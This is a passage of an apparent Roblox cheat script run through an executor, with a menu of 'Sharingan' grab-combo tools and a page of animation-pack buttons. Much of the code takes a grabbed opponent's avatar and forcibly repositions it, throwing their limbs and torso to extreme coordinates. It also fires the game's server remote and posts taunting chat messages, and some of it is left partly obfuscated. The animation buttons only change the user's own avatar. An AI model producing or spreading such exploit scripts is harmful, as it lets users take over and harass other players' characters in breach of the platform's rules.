                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                Track:Stop();
                            end
                        end
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        Grabbed = true;
                        Up = false;
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1300;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2) + Vector3.new(0, -0.1, 0);
                        AnimPlay(3355740058, 1);
                        wait(0.45);
                        Play(8595975458);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1300;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 25) + Vector3.new(0, -0.1, 0);
                        task.wait(0.5);
                        StopAudio();
                        task.wait(1);
                        Play(7791692846);
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://12507083048";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        LoadAnimation:AdjustSpeed(0.6);
                        chat("i don't care..");
                        task.wait(2);
                        chat("if this is the END..");
                        wait(3);
                        StopAudio();
                        wait(0.2);
                        Play(9120059083);
                        task.wait(1);
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        LoadAnimation:Stop(0.3);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -40);
                        Play(4766119678);
                        AnimPlay(13850663836, 1);
                        task.wait(1.5);
                        StopAudio();
                        Grabbed = true;
                        Up = false;
                        game.Players[target].Character.RightUpperLeg.Position = Vector3.new(2630, -1630, 2630);
                        game.Players[target].Character.LeftUpperLeg.Position = Vector3.new(2630, -1630, 2630);
                        game.Players[target].Character.RightUpperArm.Position = Vector3.new(2630, -1630, 2630);
                        game.Players[target].Character.LeftUpperArm.Position = Vector3.new(2630, -1630, 2630);
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        Play(7307838125);
                        task.wait(0.1);
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                        task.wait(0.01);
                        game.Players[target].Character.UpperTorso.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * 90;
                        game.Players[target].Character.RightUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        game.Players[target].Character.LeftUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false);
                        Grabbed = false;
                        Up = false;
                        LoadAnimation:Stop(0.3);
                    end
                end
            end);
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local SharinganTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            local OriginalKeyUpValue = 0;
            SharinganTool.RequiresHandle = false;
            SharinganTool.Name = "Sharingan Tobi";
            SharinganTool.Activated:Connect(function()
                if (Grabbed == true) then
                    if (Up == false) then
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                        local targetCharacter = game.Players[target].Character;
                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                Track:Stop();
                            end
                        end
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        Grabbed = true;
                        Up = false;
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 550;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 25) + Vector3.new(0, -0.1, 0);
                        task.wait(2);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        Grabbed = true;
                        Up = false;
                        Play(147722165);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 550;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2) + Vector3.new(0, -0.1, 0);
                        task.wait(0.3);
                        Grabbed = true;
                        Up = false;
                        AnimPlay(16738336650, 1.2);
                        task.wait(0.35);
                        local character = game.Players.LocalPlayer.Character;
                        Play(147722098);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -5);
                        character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(180), 0));
                        task.wait(0.1);
                        AnimStop(16738336650, 0.15);
                        task.wait(0.2);
                        AnimPlay(2788305271, 2);
                        wait(0.2);
                        Play(8595974357);
                        wait(0.2);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 20) + Vector3.new(0, 1, 0);
                        wait(0.5);
                        AnimPlay(2788838708, 1.3);
                        Play(9085204449);
                        chat("What, I Cant Believe It");
                        task.wait(3.2);
                        AnimStop(2788838708, 0.3);
                        wait(0.2);
                        chat("Just Kidding");
                        task.wait(1);
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -24);
                        AnimPlay(2791328524, 0.5);
                        character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(180), 0));
                        chat("Its Just I Expected");
                        task.wait(2.5);
                        StopAudio();
                        AnimPlay(3355740058, 1);
                        wait(0.45);
                        Play(8595975458);
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        Grabbed = true;
                        Up = false;
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1000;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 35) + Vector3.new(0, 30, 0);
                        task.wait(0.2);
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                        task.wait(1);
                        StopAudio();
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://3380627692";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        LoadAnimation:AdjustSpeed(0.4);
                        task.wait(0.5);
                        LoadAnimation:Stop(0);
                        Play(405593386);
                        local Players = game:GetService("Players");
                        local LocalPlayer = Players.LocalPlayer;
                        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait();
                        local distanceFromPlayer = 35;
                        local heightAbovePlayer = 35;
                        local sideOffset = 0;
                        local sphereShrinkTime = 1;
                        local startSphereSize = Vector3.new(70, 70, 70);
                        local minSphereSize = Vector3.new(15, 15, 15);
                        local rotationSpeed = 2;
                        local auraIntensity = 50;
                        local activeEffects = {};
                        local function createDarkAura(parent)
                            local aura = Instance.new("ParticleEmitter");
                            aura.Texture = "rbxassetid://248625108";
                            aura.Color = ColorSequence.new(Color3.new(0, 0, 0));
                            aura.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 10),NumberSequenceKeypoint.new(1, 0)});
                            aura.Transparency = NumberSequence.new(0.2);
                            aura.Lifetime = NumberRange.new(1, 4);
                            aura.Rate = auraIntensity;
                            aura.Speed = NumberRange.new(5, 15);
                            aura.Parent = parent;
                            table.insert(activeEffects, aura);
                        end
                        local function createShrinkingSphere()
                            local FlatIdent_3B868 = 0;
                            local sphere;
                            local torso;
                            while true do
                                if (4 == FlatIdent_3B868) then
                                    createDarkAura(sphere);
                                    table.insert(activeEffects, sphere);
                                    break;
                                end
                                if (FlatIdent_3B868 == 0) then
                                    sphere = Instance.new("Part");
                                    sphere.Shape = Enum.PartType.Ball;
                                    sphere.Anchored = true;
                                    FlatIdent_3B868 = 1;
                                end
                                if (FlatIdent_3B868 == 3) then
                                    torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso");
                                    if torso then
                                        sphere.CFrame = torso.CFrame * CFrame.new(sideOffset, heightAbovePlayer, -distanceFromPlayer);
                                    else
                                        return;
                                    end
                                    for i = 1, sphereShrinkTime * 10 do
                                        local FlatIdent_31077 = 0;
                                        while true do
                                            if (FlatIdent_31077 == 0) then
                                                sphere.Size = sphere.Size:Lerp(minSphereSize, i / (sphereShrinkTime * 10));
                                                wait(0.1);
                                                break;
                                            end
                                        end
                                    end
                                    FlatIdent_3B868 = 4;
                                end
                                if (FlatIdent_3B868 == 1) then
                                    sphere.CanCollide = false;
                                    sphere.Transparency = 0;
                                    sphere.BrickColor = BrickColor.new("Black");
                                    FlatIdent_3B868 = 2;
                                end
                                if (2 == FlatIdent_3B868) then
                                    sphere.Material = Enum.Material.Neon;
                                    sphere.Size = startSphereSize;
                                    sphere.Parent = workspace.CurrentCamera;
                                    FlatIdent_3B868 = 3;
                                end
                            end
                        end
                        createShrinkingSphere();
                        wait(1);
                        StopAudio();
                        task.wait(2);
                        AnimPlay(3380629232, 0.4);
                        Grabbed = true;
                        Up = false;
                        task.wait(0.1);
                        game.Players[target].Character.RightUpperLeg.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.LeftUpperLeg.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.RightUpperArm.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.LeftUpperArm.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.UpperTorso.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.Head.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.LowerTorso.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.LeftLowerLeg.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.RightLowerLeg.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.LeftFoot.Position = Vector3.new(0, -1000630, 0);
                        game.Players[target].Character.RightFoot.Position = Vector3.new(0, -1000630, 0);
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        task.wait(0.1);
                        Play(405596045);
                        local Players = game:GetService("Players");
                        local LocalPlayer = Players.LocalPlayer;
                        local fadeOutTime = 2;
                        local function fadeAndRemoveSphere()
                            local camera = workspace.CurrentCamera;
                            for _, child in pairs(camera:GetChildren()) do
                                if (child:IsA("Part") and (child.Shape == Enum.PartType.Ball)) then
                                    for i = 1, fadeOutTime * 10 do
                                        local FlatIdent_145D2 = 0;
                                        while true do
                                            if (FlatIdent_145D2 == 0) then
                                                child.Transparency = i / (fadeOutTime * 10);
                                                wait(0.1);
                                                break;
                                            end
                                        end
                                    end
                                    child:Destroy();
                                    break;
                                end
                            end
                        end
                        fadeAndRemoveSphere();
                        task.wait(1.5);
                        StopAudio();
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                        task.wait(0.01);
                        game.Players[target].Character.UpperTorso.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * 90;
                        game.Players[target].Character.RightUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        game.Players[target].Character.LeftUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false);
                    end
        
                    
        
        
                end
            end);
    end
})



local AnimationTab = UI:CreatePage("Animation")
local AnimationImport = AnimationTab:CreateSection("Animation:")


AnimationImport:CreateButton({
    Name = "Cartoony",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Bubbly",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
        Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
        Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Astronaut",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Elder",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Knight",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Mage",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Levitation",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Pirate",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Robot",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "SuperHero",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Toy",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})

AnimationImport:CreateButton({
    Name = "Zombie",
    Callback = function()
        local Animate = game.Players.LocalPlayer.Character.Animate
        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
})





